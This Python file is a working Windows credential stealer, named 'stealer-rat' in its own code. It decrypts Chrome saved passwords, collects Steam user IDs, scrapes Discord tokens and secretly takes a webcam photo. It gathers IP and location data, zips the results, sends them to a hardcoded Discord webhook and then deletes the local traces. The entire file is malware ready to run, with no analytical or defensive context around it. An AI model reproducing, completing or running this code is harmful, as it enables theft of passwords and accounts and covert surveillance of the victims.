import os
import json
import sqlite3
import shutil
import zipfile
import requests
import platform
import subprocess
import cv2
from PIL import ImageGrab
import win32crypt
from Crypto.Cipher import AES
import base64
import re

WEBHOOK_URL = "https://discord.com/api/webhooks/1524464643735683072/aXXDYLFmphfHX_lUpi2Uo3-SOkG99PO3AMWc0Wvuaq3KYin3Yd9dxxrcMoLn_Atd5QoG"

def get_steam():
    try:
        path = os.path.expandvars(r"%USERPROFILE%\AppData\Local\Steam\config\loginusers.vdf")
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                data = f.read()
            users = re.findall(r'"(\d+)"', data)
            return [{"id": u, "service": "Steam"} for u in users]
    except:
        pass
    return []

def get_chrome_passwords():
    data = []
    try:
        path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
        shutil.copy(path, "ChromePass.db")
        conn = sqlite3.connect("ChromePass.db")
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            if row[2]:
                try:
                    passwd = decrypt_chrome(row[2])
                    data.append({"url": row[0], "user": row[1], "pass": passwd})
                except:
                    pass
        conn.close()
        os.remove("ChromePass.db")
    except:
        pass
    return data

def decrypt_chrome(encrypted):
    try:
        key = get_chrome_key()
        cipher = AES.new(key, AES.MODE_GCM, encrypted[3:15])
        decrypted = cipher.decrypt(encrypted[15:])[:-16]
        return decrypted.decode()
    except:
        return ""

def get_chrome_key():
    try:
        path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
        with open(path, "r", encoding="utf-8") as f:
            state = json.load(f)
        key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        return b""

def get_discord_tokens():
    tokens = []
    paths = [
        os.path.expandvars(r"%APPDATA%\Discord\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\DiscordCanary\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\DiscordPTB\Local Storage\leveldb"),
    ]
    for p in paths:
        if os.path.exists(p):
            for f in os.listdir(p):
                if f.endswith(".log") or f.endswith(".ldb"):
                    with open(os.path.join(p, f), "r", encoding="utf-8", errors="ignore") as file:
                        content = file.read()
                        found = re.findall(r'[A-Za-z0-9_-]{24,26}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{27,38}', content)
                        tokens.extend(found)
    return list(set(tokens))

def get_browsers():
    browsers = ["Chrome", "Firefox", "Edge", "Opera", "Brave"]
    installed = []
    for b in browsers:
        try:
            if b == "Chrome":
                subprocess.run(["reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"], capture_output=True)
                installed.append(b)
            elif b == "Firefox":
                subprocess.run(["reg", "query", "HKEY_LOCAL_MACHINE\\SOFTWARE\\Mozilla\\Firefox"], capture_output=True)
                installed.append(b)
        except:
            pass
    return installed

def take_photo():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return False
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("camera.png", frame)
        cap.release()
        return ret
    except:
        return False

def get_ip_info():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=5)
        data = r.json()
        return {
            "ip": data.get("ip", "Unknown"),
            "city": data.get("city", "Unknown"),
            "region": data.get("region", "Unknown"),
            "country": data.get("country", "Unknown"),
            "device": platform.node(),
            "os": platform.system() + " " + platform.release()
        }
    except:
        return {
            "ip": "Unknown",
            "city": "Unknown",
            "region": "Unknown",
            "country": "Unknown",
            "device": platform.node(),
            "os": platform.system() + " " + platform.release()
        }

def main():
    info = get_ip_info()
    passwords = []
    
    chrome = get_chrome_passwords()
    for c in chrome:
        if c["user"] and c["pass"]:
            passwords.append({
                "service": "Google (Chrome)",
                "email": c["user"],
                "password": c["pass"]
            })
    
    steam = get_steam()
    for s in steam:
        passwords.append({
            "service": "Steam",
            "email": f"User ID: {s['id']}",
            "password": "N/A (VDF file)"
        })
    
    tokens = get_discord_tokens()
    if tokens:
        passwords.append({
            "service": "Discord",
            "email": "Token found",
            "password": tokens[0] if tokens else "N/A"
        })
    
    with open("password.txt", "w", encoding="utf-8") as f:
        f.write("──" * 25 + "\n")
        for p in passwords:
            f.write(f"{p['service']}:\n")
            f.write(f"Password: {p['password']}\n")
            f.write(f"e-mail: {p['email']}\n")
            f.write("──" * 25 + "\n")
    
    photo_taken = take_photo()
    
    with zipfile.ZipFile("stealer-rat.zip", "w") as zipf:
        zipf.write("password.txt")
        if photo_taken and os.path.exists("camera.png"):
            zipf.write("camera.png")
    
    files = {"file": open("stealer-rat.zip", "rb")}
    payload = {
        "content": f"**IP:** {info['ip']}\n**Device:** {info['device']}\n**OS:** {info['os']}\n**Location:** {info['city']}, {info['region']}, {info['country']}"
    }
    requests.post(WEBHOOK_URL, data=payload, files=files)
    
    os.remove("password.txt")
    if photo_taken and os.path.exists("camera.png"):
        os.remove("camera.png")
    os.remove("stealer-rat.zip")

if __name__ == "__main__":
    main()